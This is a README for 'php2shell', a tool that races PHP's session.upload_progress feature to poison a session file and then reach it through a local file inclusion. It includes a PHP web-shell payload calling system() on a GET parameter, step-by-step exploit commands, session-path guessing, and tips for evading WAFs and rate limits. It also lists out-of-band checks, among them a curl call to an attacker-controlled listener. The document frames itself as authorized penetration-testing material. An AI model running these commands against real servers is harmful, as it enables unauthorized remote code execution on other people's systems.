
# php2shell

**PHP `session.upload_progress` → LFI → race primitive**

A single-binary race primitive that turns a PHP file-include sink into a
candidate command-execution path by racing PHP's `session.upload_progress`
feature. **It reports `UNCONFIRMED` at most — never `CONFIRMED` / RCE.**

**Authorized security testing only. Authorized security testing only.**

[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange?logo=rust)](https://www.rust-lang.org/)
[![Version](https://img.shields.io/badge/version-0.4.0-blue)](#changelog)
[![License](https://img.shields.io/badge/license-MIT-green)](#license)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey)](#installation)

</div>

---

## ⚠️ Legal notice — read this first



This tool is provided **strictly for**:

- Authorized penetration tests with **written permission**
- CTF environments
- Isolated lab research
- Educational study

This tool must **never** be run against systems you do not own or have
explicit written permission to test. Doing so is **illegal** in most
jurisdictions (CFAA in the US, Computer Misuse Act in the UK, similar laws
in the EU and elsewhere) and violates the terms of service of virtually every
hosting provider.

By using this tool you agree that **you alone** are responsible for your
actions. The author assumes **zero liability** for misuse, damage, legal
consequences, or any other outcome arising from the use of this software.

**If you are not authorized: close this page.**

**If you are not authorized: close this page.**

---

## Table of contents

- [What is php2shell?](#what-is-php2shell)
- [What php2shell is NOT](#what-php2shell-is-not)
- [How the technique works](#how-the-technique-works)
- [Requirements](#requirements)
- [Installation](#installation)
- [Full usage guide (step by step)](#full-usage-guide-step-by-step)
  - [Step 1: Recon the target](#step-1-recon-the-target)
  - [Step 2: Dry run](#step-2-dry-run)
  - [Step 3: First exploit attempt](#step-3-first-exploit-attempt)
  - [Step 4: Read the verdict](#step-4-read-the-verdict)
  - [Step 5: Investigate an UNCONFIRMED result](#step-5-investigate-an-unconfirmed-result)
  - [Step 6: Retries and tuning](#step-6-retries-and-tuning)
  - [Step 7: Save the report](#step-7-save-the-report)
- [Complete options reference](#complete-options-reference)
- [Verdicts](#verdicts)
- [All verdicts explained](#all-verdicts-explained)
- [Worked example from scratch](#worked-example-from-scratch)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)
- [Limitations](#limitations)
- [Comparison with other tools](#comparison-with-other-tools)
- [JSON report format](#json-report-format)
- [Changelog](#changelog)
- [References](#references)
- [License](#license)

---

## What is php2shell?

**php2shell is a PHP session-upload-progress LFI race primitive.**

**php2shell is a PHP session-upload-progress LFI race primitive.**

It exploits a **race condition** in PHP's session handling to poison a
session file with an arbitrary file-include (LFI) sink. When the race wins,
the LFI includes a file the attacker shaped.

- It does **not** need any specific CVE.
- It does **not** need `allow_url_include`.
- It does **not** need to write a file you control to disk.
- It does **not** need any credentials.
- It **does** need `session.upload_progress.enabled = On` (PHP default).
- It **does** need an LFI sink.
- It **does** need a reachable session save path.

**This build does not claim RCE.** The verdict ceiling is `UNCONFIRMED`,
because reflection and execution can produce identical byte patterns in
the HTTP response. To prove execution, add an out-of-band channel —
see [Step 5](#step-5-investigate-an-unconfirmed-result).

**The tool tells you what it *observed*. It does not tell you what it
*proved*.**

---

## What php2shell is NOT

- **It is NOT a CVE.** There is no CVE for this technique. It is a
  documented attack pattern that combines two PHP features working as
  designed (PHP 5.4+, 2011+). Do **not** attach a fabricated CVE ID to your
  report. If you need an advisory, cite the LFI in the application, not this
  tool.
- **It is NOT an LFI scanner.** It does not discover LFI sinks for you.
  You must supply `--lfi` with the path to the include you already found.
- **It is NOT an authenticated exploit.** The default SID is unauthenticated.
  If the upload endpoint is behind auth, you must pass `--sid` from a real
  session (see [Step 3](#step-3-first-exploit-attempt)).
- **It is NOT a "confirmed RCE" tool.** The highest verdict is
  `UNCONFIRMED`. `execution_confirmed` is `false` on every path. A marker
  pair in the response is *consistent with* execution — it is not proof.
- **It is NOT a WAF bypass.** Aggressive WAFs will block the LFI requests.
  See [Troubleshooting](#troubleshooting) for tuning.

---

## How the technique works

### Short version

PHP's `session.upload_progress` feature writes user-controlled data into a
session file on disk **as soon as** it sees a multipart field named
`PHP_SESSION_UPLOAD_PROGRESS`. The file stays on disk **until the upload
finishes**. During that window, an LFI can include the file and execute
whatever PHP code the attacker injected.

**Poison a session file, stall the upload, include the file with LFI.
That is the entire technique.**

**Poison a session file, stall the upload, include the file with LFI.
That is the entire technique.**

### Detailed version — the race timeline

```
┌──────────────────────────────────────────────────────────────────────┐
│ Attacker                PHP-FPM                    Disk               │
├──────────────────────────────────────────────────────────────────────┤
│                                                                       │
│ 1. POST multipart  ──►  parses field value  ──►  writes sess_abc123   │
│    (payload in           (session.upload_progress)  to disk          │
│     progress field)                                                   │
│                                                                       │
│ 2. ── STALL ──           ...waiting...            file still exists   │
│    (upload not yet                                 (nothing has        │
│     finished)                                       deleted it)       │
│                                                                       │
│ 3. GET /lfi?file= ──►  include sess_abc123  ──►   candidate execution │
│      sess_abc123         (executes PHP)                               │
│                                                                       │
│ 4. finish upload  ──►  cleanup  ──►               file deleted        │
│                                                                       │
└──────────────────────────────────────────────────────────────────────┘
```

The key insight: **step 2 and step 3 happen at the same time.** The upload
is still open, the file is on disk, and the LFI is firing repeatedly. When
one of the LFI requests includes the file before cleanup runs, the injected
PHP executes.

**If you fire the LFI after the upload finishes, the file has already been
deleted and you get nothing.** This is the most common implementation bug in
public PoCs — this tool does it right.

**The LFI must fire DURING the stall, not after the upload.**
**The LFI must fire DURING the stall, not after the upload.**

### Why the payload goes in the progress-field value

The payload is placed in the **value** of the `PHP_SESSION_UPLOAD_PROGRESS`
field, not in the filename:

- **Filenames are sanitized differently** across PHP versions.
- **WAFs look for `<?php` in filenames**, but rarely in form values.
- **The value is what gets serialized into the session file** in every
  known PHP version.

**Payload in the value, not the filename.**
**Payload in the value, not the filename.**

### How the marker pair works — and why it is *not* proof

The default probe command is:

```php
<?php error_reporting(E_ALL);ini_set('display_errors','1');
$m="PFMARK_XXXXXXXX"; echo $m; system($_GET['c']); echo $m; ?>
```

Two markers appear when the payload runs:

```
... PFLMARK_XXXXXXXX <output> PFLMARK_XXXXXXXX ...
```

A single marker can come from **reflection** — the target dumping the
session file contents without executing PHP:

```
progress|s:60:"<?php $m="PFLMARK_XXXXXXXX"; ... ?>"; ...
```

A marker **pair** with content between them is a *stronger* signal — but
**still not proof**. A template engine, log viewer, or serializer that
re-emits the file twice produces the same shape.

**This build deliberately caps the verdict at `UNCONFIRMED`** even when the
marker pair is present. There is no `CONFIRMED` / RCE verdict, and
`execution_confirmed` is `false` on every path. To move past `UNCONFIRMED`,
use an out-of-band channel — see [Step 5](#step-5-investigate-an-unconfirmed-result).

**Default probe is `echo PHP_TRANSPORT_PROBE_OK`**, not `id`. Echo is a
language construct — it is not affected by `disable_functions`. If `id`
returns nothing but `echo` returns a marker pair, the shell is likely
disabled; the tool reports `disabled_function_suspected: true` in the
report.

---

## Requirements

### To run php2shell

- **Rust 1.70+** (only if building from source)
- A C toolchain (for `native-tls`)
- OpenSSL dev headers on Linux

### On the target

- **PHP 5.4 or newer** (session upload progress shipped in 5.4)
- **`session.upload_progress.enabled = On`** (PHP default)
- **An LFI sink** — a page that includes a user-controlled path
- **A reachable session save path** — `/var/lib/php/sessions`, `/tmp`,
  `/var/lib/php5`, or discoverable via phpinfo / config leak
- **Not behind auth**, OR you have a valid SID (see `--sid`)

---

## Installation

### From source (recommended)

```bash
git clone https://github.com/kaxm23/php2shell.git
cd php2shell
cargo build --release
sudo install -m 0755 target/release/php2shell /usr/local/bin/
```

Install build dependencies first:

```bash
# Debian / Ubuntu
sudo apt install -y build-essential pkg-config libssl-dev

# Fedora / RHEL
sudo dnf install -y gcc make openssl-devel

# Arch
sudo pacman -S --needed base-devel openssl

# macOS (Homebrew)
brew install openssl pkg-config
```

### Pre-built binaries

Releases page: <https://github.com/kaxm23/php2shell/releases>

| Platform | Binary |
|---|---|
| Linux x86_64 | `php2shell-<ver>-x86_64-unknown-linux-gnu` |
| Linux aarch64 | `php2shell-<ver>-aarch64-unknown-linux-gnu` |
| macOS x86_64 | `php2shell-<ver>-x86_64-apple-darwin` |
| macOS arm64 | `php2shell-<ver>-aarch64-apple-darwin` |
| Windows x86_64 | `php2shell-<ver>-x86_64-pc-windows-msvc.exe` |

### Verify installation

```bash
php2shell --version
php2shell --help
```

**If those two commands work, you are ready to proceed.**
**If those two commands work, you are ready to proceed.**

---

## Full usage guide (step by step)

This section walks you from "I have a target URL" to "I have a JSON report
that describes what I observed."

**Follow the steps in order. Do not skip Step 2.**
**Follow the steps in order. Do not skip Step 2.**

### Step 1: Recon the target

Before you run php2shell, you need to know three things:

1. **Is the target PHP?**
2. **Is `session.upload_progress.enabled = On`?** (usually yes by default)
3. **What is the LFI sink?** — the URL and parameter

If you don't have an LFI yet, **stop here.** php2shell is not an LFI
scanner. Run `ffuf`, `feroxbuster`, or your LFI discovery tool of choice
first. You need an actual LFI sink URL like:

```
http://lab.local/download.php?file=/etc/passwd
```

Also try to determine the **session save path**. Common values:

- `/var/lib/php/sessions` — Debian/Ubuntu default
- `/var/lib/php5` — older Debian
- `/tmp` — many distros and containers
- `/var/lib/php/session` — some RHEL
- Application-specific paths

If you can leak `phpinfo()`, look for `session.save_path`. If not, try the
common paths.

**No LFI = no exploit. No LFI = no exploit.**
**No LFI = no exploit. No LFI = no exploit.**

### Step 2: Dry run

**Always dry-run first.** It shows exactly what will be sent, without
sending it.

```bash
php2shell --dry-run \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

You will see (defaults are `-s 3000`, `-c 'echo PHP_TRANSPORT_PROBE_OK'`):

```
[dry-run] === request line + headers ===
POST / HTTP/1.1
Host: lab.local
User-Agent: Mozilla/5.0 ...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
Content-Length: 2201
Cookie: PHPSESSID=...
Connection: close

[dry-run] === part1 (1420 bytes), sleep 3s ===
[dry-run] === part2 (781 bytes) ===
[dry-run] LFI URL: http://lab.local/download.php?file=/var/lib/php/sessions/sess_...&c=echo%20PHP_TRANSPORT_PROBE_OK
```

**Check these before proceeding:**

- **Is the LFI URL correct?** Does it point at a real include sink?
- **Is the session path correct?** Does `/var/lib/php/sessions` match the
  target's config?
- **Is the POST path correct?** Default is the path from the target URL —
  is that where the upload should go?
- **Is `Cookie: PHPSESSID=...` set?** Yes, php2shell manages this
  automatically.

**Fix any incorrect values in the dry run before sending real traffic.**
**Fix any incorrect values in the dry run before sending real traffic.**

### Step 3: First exploit attempt

Once the dry run looks good, run for real. `-c` overrides the default probe
(`echo PHP_TRANSPORT_PROBE_OK`, which `disable_functions` cannot block):

```bash
php2shell -v \
    -c 'id' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

**Understanding the `--lfi` template.** This is the most important flag.
The template must contain three substitution tokens:

| Token | Replaced with | Example |
|---|---|---|
| `%SID%` | URL-encoded PHPSESSID | `k3f9m2x8p1q7r4t6...` |
| `%CMD%` | URL-encoded command | `id` |
| `%PARAM%` | URL-encoded GET parameter name | `c` |

The template is *not* a literal URL — it's a template. `%SID%` is replaced
with the current session ID on every attempt. `%CMD%` is replaced with the
`--cmd` value. `%PARAM%` is replaced with the `--param` value (default `c`).

A typical template:

```
http://lab.local/view.php?page=/var/lib/php/sessions/sess_%SID%&c=%CMD%
```

After substitution this becomes:

```
http://lab.local/view.php?page=/var/lib/php/sessions/sess_k3f9m2x8...&c=id
```

**Template must contain `%SID%`, `%CMD%`, and `%PARAM%`.**
**Template must contain `%SID%`, `%CMD%`, and `%PARAM%`.**

If you omit `%SID%`, poisoning is unreachable. If you omit `%CMD%`, no
command is injected. If you omit `%PARAM%`, the parameter name doesn't
match the payload. The tool warns about all three in `notes`.

### Step 4: Read the verdict

After the run, look at the verdict block:

```
==============================================
  VERDICT:      UNCONFIRMED
  Target:       http://lab.local/
  PHP version:  8.2.7
  Marker output (UNVERIFIED): PHP_TRANSPORT_PROBE_OK
  ---
  Attempts:     1
==============================================
```

Note the `(UNVERIFIED)` label — this is deliberate. `marker_output` is what
appeared between the two markers. It is **not** proof that the target
executed anything. A reflection bug produces the same shape.

**What each verdict means for what you do next:**

| Verdict | What it means | What to do |
|---|---|---|
| **`UNCONFIRMED`** | Marker pair present; reflection cannot be ruled out | **Not proof.** Add an OOB channel (Step 5). |
| **`NO_LFI`** | LFI probes ran, no marker pair | Verify `--lfi` template; check session path; retry. |
| **`HTTP_ERROR`** | 5xx, or non-login 3xx (WAF/gate/CDN) | Retry once; slow down if gate. |
| **`AUTH_REQUIRED`** | 401, or 3xx to a login page | Get a real SID, use `--sid`. |
| **`RATE_LIMITED`** | 429, or exhausted rate-limit header | `--lfi-workers 1 --lfi-interval 500`, or `--proxy`. |
| **`UNKNOWN`** | Transport error, timeout, or unrecognised response | Double-check URL; rerun with `-v`. |
| **`DRY_RUN`** | `--dry-run` completed | Expected — nothing sent. |

**`NO_LFI` is not `Patched`. `NO_LFI` is not "not vulnerable."**

`NO_LFI` means: *I ran the race and LFI probes, but I did not observe
inclusion. Either the race lost, the LFI path is wrong, or the target
genuinely does not include the file.*

If you see `NO_LFI` and file a "not vulnerable" report, **you have not
tested the target.** Verify the session path and the LFI template.

### Step 5: Investigate an UNCONFIRMED result

`UNCONFIRMED` with a marker pair means the evidence is *consistent with*
execution, but **reflection cannot be ruled out from the HTTP response
alone**. Add an **out-of-band channel** that a pure reflection bug cannot
fake:

- **Time-based**: `-c 'sleep 5'` — if response latency jumps ~5 s,
  the target executed the command. Reflection does not add wall-clock
  delay.
- **DNS-based**: `-c 'nslookup <unique>.burpcollaborator.net'` — if the
  DNS hit arrives at your listener, execution happened. Reflection does
  not cause DNS traffic.
- **Outbound HTTP**: `-c 'curl http://<your-listener>/<nonce>'` — the
  hit at the listener is proof, not the response body.
- **File-write**: `-c 'echo <nonce> > /var/www/html/probe-<nonce>.txt'`
  then `GET /probe-<nonce>.txt` — if the file exists with matching
  content, execution happened.

```bash
php2shell -c 'sleep 5' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    -o proof.json \
    http://lab.local/
```

**Do NOT report `UNCONFIRMED` as RCE.** The tool is honest that it cannot
distinguish execution from reflection — you have to add a channel that can.
A report needs evidence a reflection bug cannot produce: wall-clock latency,
an OOB callback, or an on-disk artefact.

### Step 6: Retries and tuning

`--retries N` loops end-to-end. It stops early when a non-`UNKNOWN` /
non-`HTTP_ERROR` verdict is reached — so a real hit or a real auth gate ends
the loop early. If the first attempt gives `UNCONFIRMED` with no marker
pair, try in order:

**A. Increase retries.**

```bash
php2shell --retries 5 \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

**B. Increase the stall.**

Default `--stall 3000` (ms) comfortably exceeds PHP's default `min_freq`
of 1000 ms. If the target is slow, increase further.

```bash
php2shell --stall 5000 \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

**C. Increase LFI workers.**

More workers = more tries per stall = higher chance of a hit.

```bash
php2shell --lfi-workers 16 --lfi-interval 50 \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

**D. Try a different session path.**

If `/var/lib/php/sessions` is wrong, the LFI includes the wrong file. Try:

- `/tmp/sess_%SID%`
- `/var/lib/php5/sess_%SID%`
- `/var/lib/php/session/sess_%SID%`

```bash
php2shell --lfi 'http://lab.local/download.php?file=/tmp/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

**E. Try an authenticated SID.**

If the target has `session.use_strict_mode=1`, it regenerates unknown SIDs
and poisoning fails. The tool auto-detects strict mode (via a warmup POST)
and reuses the server-issued SID across retries — but if that fails, log in
manually and pass `--sid`:

```bash
curl -c cookies.txt -d 'user=admin&pass=admin' http://lab.local/login.php
SID=$(grep PHPSESSID cookies.txt | awk '{print $7}')

php2shell --sid "$SID" \
    --cookie 'auth=1' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

If the SID is regenerated (visible in `Set-Cookie`), the tool reports
`UNCONFIRMED` with a warning in `notes`.

### Step 7: Save the report

Always save a JSON report for your engagement record:

```bash
php2shell -v --retries 3 \
    -c 'sleep 5' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    -o lab-$(date +%Y%m%d-%H%M%S).json \
    http://lab.local/
```

The JSON report contains:

- The **exact payload** transmitted (not a template)
- The **SID used**
- The **LFI template**
- The **command run**
- The **marker output (unverified)**
- `execution_confirmed: false` on every path
- `retry_after` when the server sent one (reported, does not change verdict)
- `disabled_function_suspected` when a "has been disabled" warning appeared
- The **verdict** and **notes**
- A **timestamp**

**Paste this report into your deliverable. It describes what you observed.**
**Paste this report into your deliverable. It describes what you observed.**

---

## Complete options reference

Every flag, what it does, and when to use it.

### Target & command

| Flag | Default | Description |
|---|---|---|
| `<TARGET>` | — | Base URL of the target (`http://` or `https://`). Path component used as default POST path. |
| `-c, --cmd <CMD>` | `echo PHP_TRANSPORT_PROBE_OK` | Command to run via `system()`. Default is a language-construct probe — `echo` is not affected by `disable_functions`. Output does **not** imply RCE. |
| `--param <NAME>` | `c` | GET parameter name for the command (`$_GET[<NAME>]`). Must match `%PARAM%` in the LFI template. |
| `--session-name <NAME>` | `PHPSESSID` | PHP `session.name` value. Only change if you know the target overrides it. |
| `--post-path <PATH>` | target path | Where to POST the throttled upload. Only change if uploads go to a specific endpoint. |

### Race tuning

| Flag | Default | Description |
|---|---|---|
| `-s, --stall <MS>` | `3000` | Milliseconds to stall between upload chunks. Must exceed `session.upload_progress.min_freq` (default `1000`). Increase for slow targets. |
| `--lfi-workers <N>` | `8` | Concurrent LFI requests during the stall. More = higher hit chance, but noisier. |
| `--lfi-interval <MS>` | `100` | Delay between LFI attempts per worker. Decrease for aggressive, increase for WAF evasion. |
| `--lfi-max-attempts <N>` | `5000` | Hard cap on LFI probe attempts across all workers. **An attempt that fails before dispatch still consumes budget** — this is an attempt cap, not a strict wire-request cap. |
| `--retries <N>` | `1` | Full end-to-end attempts. Stops early on any non-`UNKNOWN` / non-`HTTP_ERROR` verdict. |

### Session control

| Flag | Default | Description |
|---|---|---|
| `--sid <SID>` | random | Fixed PHPSESSID. **Required for authenticated targets.** |
| `--sid-length <N>` | `26` | Length of the randomly generated SID. |
| `--sid-charset <SET>` | `5bit` | SID charset: `hex` (0-9a-f), `5bit` (0-9a-v, PHP default), `6bit` (0-9a-zA-Z,-). |
| `--progress-field <NAME>` | `PHP_SESSION_UPLOAD_PROGRESS` | Field name that triggers upload progress. |

### Request shaping

| Flag | Default | Description |
|---|---|---|
| `-A, --user-agent <UA>` | random | Custom User-Agent. Pool of 3 real browser UAs by default. |
| `--cookie <KV>` | — | Extra cookies. Session cookie is managed automatically. |
| `--header "K: V"` | — | Extra header, repeatable. `Cookie:` is automatically merged into `--cookie`. |
| `--proxy <URL>` | — | `http://` (all traffic) or `socks5://` (LFI only — race socket needs HTTP `CONNECT`). |
| `--timeout <SEC>` | `15` | Per-request timeout. |
| `--sni <HOSTNAME>` | — | Explicit TLS SNI hostname. Required when the target is an IP with a named vhost. |
| `--no-verify-hostname` | off | Disable hostname verification only; keep chain verification. Backend-dependent — see module doc. |
| `-k, --insecure` | off | Skip **all** TLS verification (chain + hostname). Unsafe outside labs. |

### Workflow

| Flag | Description |
|---|---|
| `--dry-run` | Print request shape and LFI URL; do not send any traffic. |
| `--skip-fingerprint` | Skip PHP detection. Useful when you already know the target. |
| `-v, --verbose` | Per-request logging. Shows race timeline, LFI worker status, timing. |
| `-o, --output <FILE>` | Write structured JSON report to `<FILE>`. |

---

## Verdicts

`classify()` evaluates in this order; the first matching row wins.

| # | Observation | Verdict |
|---|---|---|
| 1 | Transport error or timeout before a usable response | `UNKNOWN` |
| 2 | HTTP 429, or an exhausted rate-limit header | `RATE_LIMITED` |
| 3 | HTTP 401 | `AUTH_REQUIRED` |
| 4 | HTTP 3xx whose Location resolves same-origin to a login path | `AUTH_REQUIRED` |
| 5 | HTTP 3xx whose Location does not match a login gate | `HTTP_ERROR` |
| 6 | HTTP 5xx (including 503 with `Retry-After`) | `HTTP_ERROR` |
| 7 | Both markers present in the response body | `UNCONFIRMED` |
| 8 | LFI attempts > 0, no markers | `NO_LFI` |
| 9 | HTTP 2xx, no `--lfi` template supplied | `UNCONFIRMED` |
| 10 | Anything else | `UNKNOWN` |

`Retry-After` is recorded in the report (`retry_after`) and surfaced as a
note, but does **not** change the verdict. It signals a *requested delay* —
maintenance, overload, and gateway backoff all send it — not proof of
rate limiting. `RATE_LIMITED` fires on 429 or an explicit rate-limit
header only.

`UNCONFIRMED` is an honest result when the evidence cannot distinguish
execution from reflection. Even non-empty output between markers is not
proof by itself. This build has no `CONFIRMED` / RCE verdict, and
`execution_confirmed` is `false` on every path.

---

## All verdicts explained

Seven possible verdicts, each with a specific meaning. **Learn them all.**
**Learn them all.**

| Verdict | Meaning | Severity | Next step |
|---|---|---|---|
| **`UNCONFIRMED`** | Marker pair present; reflection cannot be ruled out | **Inconclusive — NOT confirmed RCE** | Add an OOB channel (Step 5) |
| **`NO_LFI`** | LFI probes ran, no marker pair | **Untested (partial)** | Verify `--lfi` template; check session path |
| **`HTTP_ERROR`** | 5xx, or non-login 3xx (WAF/gate/CDN) | **Needs investigation** | Retry once; slow down if gate |
| **`AUTH_REQUIRED`** | 401, or 3xx to a login path | **Blocked by auth** | Obtain a real SID, use `--sid` |
| **`RATE_LIMITED`** | 429, or exhausted rate-limit header | **Blocked by rate limit** | Slow down; use `--proxy` |
| **`UNKNOWN`** | Transport error, timeout, or unrecognised response | **Not applicable** | Double-check URL; rerun with `-v` |
| **`DRY_RUN`** | `--dry-run` completed | **N/A** | Expected — nothing sent |

**This build has no `CONFIRMED` verdict. `UNCONFIRMED` is not a positive
finding.**

`UNCONFIRMED`, `NO_LFI`, and `HTTP_ERROR` are **not** negative findings —
they are **inconclusive** findings. Do not report them as "not vulnerable."
Report them as "attempted, inconclusive, see notes."

---

## Worked example from scratch

Let's walk through a full engagement from zero to a report.

### Scenario

- Target: `http://lab.local/`
- Known LFI: `http://lab.local/download.php?file=/etc/passwd`
- Session path: Debian default `/var/lib/php/sessions`
- Auth: none

### Step 1 — Confirm the LFI

```bash
curl 'http://lab.local/download.php?file=/etc/passwd' | head -3
```

Expected output:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

**LFI confirmed.** Now convert the file path into the exploit template.

### Step 2 — Build the LFI template

Original LFI:

```
http://lab.local/download.php?file=/etc/passwd
```

Convert to template:

```
http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%
```

- Replaced `/etc/passwd` with `/var/lib/php/sessions/sess_%SID%` (session file path)
- Added `&c=%CMD%` (command parameter)

### Step 3 — Dry run

```bash
php2shell --dry-run \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

Inspect the output. Confirm the LFI URL is correct. **Only proceed if it looks right.**

### Step 4 — First attempt

```bash
php2shell -v \
    -c 'echo PHP_TRANSPORT_PROBE_OK' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

If the marker pair appears:

```
==============================================
  VERDICT:      UNCONFIRMED
  Marker output (UNVERIFIED): PHP_TRANSPORT_PROBE_OK
==============================================
```

Move to Step 5 to investigate.

If `NO_LFI`, move to Step 6 (Troubleshooting).

### Step 5 — Out-of-band proof

```bash
php2shell -v --retries 3 \
    -c 'sleep 5' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    -o lab-engagement-2025.json \
    http://lab.local/
```

Measure wall-clock latency. If the response took ~5 s longer than baseline,
the command ran. A reflection bug cannot delay the response.

The `lab-engagement-2025.json` file now contains:

- Marker output (unverified)
- SID used
- Payload transmitted
- LFI template
- `execution_confirmed: false` (this build has no OOB collection)
- Timestamp
- Full verdict and notes

**That JSON file records what the tool observed. You add OOB evidence
separately.**

### Step 6 — Troubleshooting (if needed)

If you got `NO_LFI` at Step 4, try in order:

1. **Increase retries**: `--retries 5`
2. **Increase stall**: `--stall 5000`
3. **Increase workers**: `--lfi-workers 16`
4. **Try `/tmp` session path**: `--lfi '...file=/tmp/sess_%SID%&c=%CMD%'`
5. **Check verbose output** for `LFI ... -> 404` (wrong path) vs `-> 200` (right path, wrong content)
6. **Try authenticated SID** with `--sid` if target uses strict mode

**Repeat until the marker pair appears or you've exhausted all options.**

---

## Troubleshooting

### `UNCONFIRMED` verdict

Most common outcome when the race wins. A marker pair is present, but the
tool cannot distinguish execution from reflection. Check in order:

**1. Is the marker pair actually present?**

Look for `marker_pair_detected: true` in the JSON. If false, you have
`NO_LFI` instead — see below.

**2. Is `disabled_function_suspected` true?**

The "has been disabled" warning appeared between markers. The shell function
is blocked. `echo` still works (language construct), but `system()` does
not. You can still exfiltrate via other language primitives, but
`system($_GET['c'])` will not work.

**3. Is `marker_output` empty?**

Empty content between markers means either the command returned nothing, or
the shell function was blocked. Try `-c 'echo hi'` (language construct) — if
`hi` appears, the payload executes.

**4. Add an OOB channel.**

See [Step 5](#step-5-investigate-an-unconfirmed-result). The HTTP response
alone cannot prove execution.

### `NO_LFI` verdict

The race ran but the LFI probes did not observe a marker pair.

**1. Was the LFI path correct?**

Look for `[w0] LFI -> 200` in `-v` output. If you see `-> 404`, the path
in your `--lfi` template is wrong (session file doesn't exist there, or
the parameter name is wrong).

**2. Was the session file path correct?**

Try alternatives:

```bash
--lfi 'http://lab.local/download.php?file=/tmp/sess_%SID%&c=%CMD%'
--lfi 'http://lab.local/download.php?file=/var/lib/php5/sess_%SID%&c=%CMD%'
--lfi 'http://lab.local/download.php?file=/var/lib/php/session/sess_%SID%&c=%CMD%'
```

**3. Was the SID regenerated?**

Look in `-v` output for `Set-Cookie contains a different SID`. The tool
auto-detects strict mode via a warmup POST and reuses the server-issued
SID; if that fails, provide `--sid` manually:

```bash
curl -c cookies.txt -d 'user=admin&pass=admin' http://lab.local/login.php
SID=$(grep PHPSESSID cookies.txt | awk '{print $7}')
php2shell --sid "$SID" --lfi '...' http://lab.local/
```

**4. Was the stall too short?**

PHP's `session.upload_progress.min_freq` is 1000 ms by default. If your
`--stall` is below the progress-write interval and the target is slow, the
progress file may never be written before the LFI fires. Try `--stall 5000`.

**5. Is `serialize_handler=php_serialize`?**

If yes, the marker sits inside a serialized string and never executes. **Not
detected by php2shell.** Mitigation is heap grooming, out of scope. Check
`phpinfo()` or server config if accessible.

### `AUTH_REQUIRED` verdict

The upload endpoint redirected to a login page, or returned 401. You need
authentication. Log in with the app first, extract the PHPSESSID, and
pass `--sid`:

```bash
php2shell --sid 'real-session-id' --cookie 'auth=1' --lfi '...' http://lab.local/
```

### `HTTP_ERROR` verdict

> Applies to **both** 5xx/timeout/reset AND non-login 3xx (WAF/gate/CDN).

**For a gate:**

WAF or access gate blocked the LFI. Slow down:

```bash
php2shell --lfi-workers 1 --lfi-interval 500 --lfi '...' http://lab.local/
```

If still blocked, try a different User-Agent:

```bash
php2shell -A 'Mozilla/5.0 (compatible; Googlebot/2.1)' --lfi '...' http://lab.local/
```

**For 5xx / timeout / reset:**

Retry once:

```bash
php2shell --retries 2 --lfi '...' http://lab.local/
```

If it consistently crashes, investigate — could be a filter that crashes on
include, or a resource exhaustion. Report it as a separate finding.

### `RATE_LIMITED` verdict

HTTP 429, or an exhausted rate-limit header (`X-RateLimit-Remaining: 0`).
`Retry-After` alone does *not* trigger this — maintenance, overload, and
gateway backoff all send it.

Slow down:

```bash
php2shell --lfi-workers 1 --lfi-interval 2000 --lfi '...' http://lab.local/
```

Or route through a rotating proxy pool with `--proxy`.

### `UNKNOWN` verdict

Transport error, timeout, or unrecognised response. Double-check the URL:

```bash
curl -I http://lab.local/ | grep -i 'x-powered-by\|server'
```

If it's a TLS issue (self-signed cert, IP vhost without SNI):

```bash
php2shell --sni correct-vhost.example -k --lfi '...' https://1.2.3.4/
```

If it's a transient timeout, retry with a longer `--timeout 30`.

### Slow or hang

- Reduce `--timeout`: `--timeout 5`
- Reduce `--lfi-workers`: `--lfi-workers 4`
- Reduce `--lfi-max-attempts`: `--lfi-max-attempts 1000`

---

## FAQ

### Is this a CVE?

**No.** This is a technique that combines two PHP features working as
designed. There is no CVE for the technique itself. If your report needs a
CVE, cite the LFI in the application — not php2shell.

### Why does `--lfi` matter so much?

Because the race alone proves *nothing* about whether the target is
reachable for inclusion. The race can succeed against any PHP target with
upload progress enabled. Only the LFI probes inclusion. **Without `--lfi`,
you have not tested whether the poisoning is reachable.**

**Without `--lfi`, you have not tested anything.**
**Without `--lfi`, you have not tested anything.**

### Why does the tool cap at `UNCONFIRMED`?

Because a marker pair in the HTTP response is *consistent with* execution,
but does not rule out reflection. A template engine, log viewer, or
serializer that re-emits the file twice produces the same shape. The tool
reports what it observed, not what it proved. To prove execution, add an
out-of-band channel — see [Step 5](#step-5-investigate-an-unconfirmed-result).

### Why is `execution_confirmed` always `false`?

Because this build has no out-of-band collection primitive. The field exists
so downstream consumers can rely on it: if the tool ever gains OOB collection
in a future build, `execution_confirmed` becomes meaningful. Today it is
`false` on every path — do not promote `marker_pair_detected` to `true`
without adding that primitive.

### Why does `NO_LFI` exist?

Because reporting `NO_LFI` as "not vulnerable" is the #1 cause of false
negatives for this technique. `NO_LFI` is explicitly a *not tested / not
observed* verdict, not a *not vulnerable* verdict.

